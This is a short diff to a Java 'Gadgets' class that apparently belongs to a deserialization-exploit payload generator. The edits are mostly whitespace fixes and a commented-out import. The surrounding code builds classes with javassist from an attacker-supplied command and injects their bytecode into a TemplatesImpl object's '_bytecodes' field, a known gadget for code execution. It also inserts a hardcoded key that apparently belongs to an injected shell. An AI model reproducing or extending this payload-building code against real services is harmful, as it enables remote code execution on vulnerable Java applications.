@@ -17,6 +17,7 @@ import java.util.Map;
 import com.nqzero.permit.Permit;
 import javassist.*;
 
+//import sun.reflect.annotation.AnnotationInvocationHandler;
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
@@ -319,7 +320,7 @@ public class Gadgets {
     }
 
 
-    public static <T> T createTemplatesImpl(final String command, Class c,Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory, String template,String mode)
+    public static <T> T createTemplatesImpl(final String command, Class c, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory, String template, String mode)
         throws Exception {
         final T templates = tplClass.newInstance();
         final byte[] classBytes;
@@ -338,7 +339,7 @@ public class Gadgets {
             CtClass superC = pool.get(abstTranslet.getName());
             clazz.setSuperclass(superC);
 
-             classBytes = clazz.toBytecode();
+            classBytes = clazz.toBytecode();
         } else {
 
                     ClassPool pool = ClassPool.getDefault();
@@ -354,9 +355,9 @@ public class Gadgets {
                     String keyInit = String.format("key = \"%s\";", command == null ? "a65cccfcfd8f670d" : new BigInteger(1, md.digest()).toString(16).substring(0,16));
                     constructor.insertBefore(keyInit);
                     classBytes = ctClass.toBytecode();
-                }else {
-                    classBytes = ctClass.toBytecode();
-                }
+            }else {
+                classBytes = ctClass.toBytecode();
+            }
         }
         // inject class bytes into instance
         Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {classBytes});
